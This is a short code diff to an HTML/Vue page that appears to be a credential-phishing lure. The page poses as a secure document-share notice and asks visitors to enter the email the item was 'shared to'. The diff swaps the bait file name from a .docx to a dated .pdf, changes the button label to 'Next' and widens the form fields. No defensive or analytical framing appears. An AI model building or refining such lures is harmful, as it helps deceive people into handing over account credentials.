@@ -19,7 +19,7 @@
       <div class="content">
        <img src="https://i.postimg.cc/s2TBQ89k/ldimg1.png" width="100" height="35">
         <p>You've received a secure link to:</p>
-        <p style="font-size: 16px;">TT93794-2025.docx</p>
+        <p style="font-size: 16px;">AA484937-13-06-2025.pdf</p>
         <p style="font-size: 16px;">To proceed, enter the email that this <br>item was shared to</p>
 
         <div class="form-wrapper">
@@ -32,7 +32,7 @@
           <p v-if="error" class="error" role="alert" aria-live="polite">{{ error }}</p>
 
           <button @click="submitForm" :disabled="loading" class="action-button">
-            {{ loading ? 'Submitting…' : 'Submit' }}
+            {{ loading ? 'Submitting…' : 'Next' }}
           </button>
         </div>
       </div>
@@ -237,7 +237,7 @@ html, body {
 }
 
 .email-input {
-  width: 90%;
+  width: 75%;
   padding: 0.6rem;
   border: 1px solid #818181;
   border-radius: 5px;
@@ -261,7 +261,7 @@ html, body {
   border-radius: 9px;
   cursor: pointer;
   font-size: 1rem;
-  width: 50%;
+  width: 75%;
   transition: background-color 0.2s ease;
 }
 
